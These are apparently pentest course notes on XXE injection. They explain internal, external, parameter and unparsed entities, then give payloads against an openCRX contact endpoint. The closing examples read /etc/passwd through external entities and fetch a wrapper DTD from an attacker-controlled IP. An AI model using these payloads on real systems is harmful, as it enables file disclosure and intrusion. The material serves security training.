An XML External Entity attack is a type of attack against an application that parses XML input. 
This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. 

This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.

In a typical XXE injection, the attacker forces the XML parser to process one or more external entities. 
This can result in the disclosure of confidential information not normally accessible by the application. 
That means the main prerequisite for the attack is the ability to feed a maliciously-crafted XML request containing system identifiers that point to sensitive data to the target XML processor.

Additionally, depending on the application's programming language and the available protocol wrappers, it may be possible to leverage this attack for full command injection.

- https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#exploiting-xxe-to-retrieve-files

## XML Entities

From the attacker's perspective, Document Type Definitions (DTDs) are an interesting feature of XML. 
DTDs can be used to declare XML entities within an XML document. 

In very general terms, an XML entity is a data structure typically containing valid XML code that will be referenced multiple times in a document.


XML supports CDATA sections in which internal contents arenot treated as markup. 
A CDATA section starts with `<![CDATA[` and ends with `]]>`. 

Anything between the tags is treated as text. 
If we can wrap file contents in CDATA tags, the parser will not treat it as markup.

## Internal Entities

Internal entities are locally defined within the DTD. 
Their general format is as follows:

```xml
<!ENTITY name "entity_value">
```

This is a very trivial example of an internal entity:
```xml
<!ENTITY test "<entity-value>test value</entity-value>">
```

## External Entities

By definition, external entities are used when referencing data that is not defined locally. 
As such, a critical component of the external entity definition is the URI from which the external data will be retrieved.

External entities can be split into two groups, namely private and public. 
The syntax for a private external entity is:
```xml
<!ENTITY name SYSTEM "URI">
```

This is an example of a private external entity:

```xml
<!ENTITY myinfo SYSTEM"http://somesite.com/somedoc.xml">
```

In contrast, public external entities are intended for a much wider audience. 
The syntax for a public external entity is:

```xml
<!ENTITY name PUBLIC "public_id" "URI">
```

This is an example of a public external entity:

```xml
<!ENTITY myinfo PUBLIC "-//W3C//TEXT companyinfo//EN" "http://somesite.com/somedoc.xml">
```

## Parameter Entities

Parameter entities exist solely within a DTD, but are otherwise very similar to any other entity. 
Their definition syntax differs only by the inclusion of the %prefix:

```xml
<!ENTITY % name SYSTEM "URI">
<!ENTITY % course 'AWAE'>
<!ENTITY Title 'Offensive Security presents %course;' >
```

## Unparsed External Entities

An XML entity does not have to contain valid XML code. It can contain non-XML data as well. 
In those instances, we have to prevent the XML parser from processing the referenced data by using the NDATA declaration. 
The following formats can be used for both public and private external entities.

```xml
<!ENTITY name SYSTEM "URI" NDATA TYPE>
<!ENTITY name PUBLIC "public_id" "URI" NDATA TYPE>
```

We can access binary content with unparsed entities.

### Examples

When an XML parser encounters an entity reference, it replaces the reference with the entity’s value.

```xml
<?xml version="1.0" ?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname "Replaced">
]>
<Contact>
 <lastName>&lastname;</lastName>
 <firstName>Tom</firstName>
</Contact>
```

When the XML above is parsed, the parser replaces the entity reference `&lastname;` with the entity’s value `Replaced`. 
If an application used the results and displayed the contact’s name, it would display `Tom Replaced`.
 
This example uses an internal entity.
What if we change the XML entity to an external entity and reference a file on the server?

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "file:///etc/passwd">
]>
<org.opencrx.kernel.account1.Contact>
 <lastName>&lastname;</lastName>
 <firstName>Sarah</firstName>
</org.opencrx.kernel.account1.Contact>
```

If the application is vulnerable to XXE, we want to make sure we can observe the results of the XXE attack. 
Ideally, we would inject the XXE payload into a field that is displayed in the web application.

### CDATA XXE Exploit Example

```bash
kali@kali:/opencrx$ sudo cat /var/www/html/wrapper.dtd
<!ENTITY wrapper "%start;%file;%end;">

<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///etc/passwd" >
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://192.168.119.120/wrapper.dtd">
%dtd;
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&wrapper;</lastName>
  <firstName>Sarah</firstName></org.opencrx.kernel.account1.Contact>
```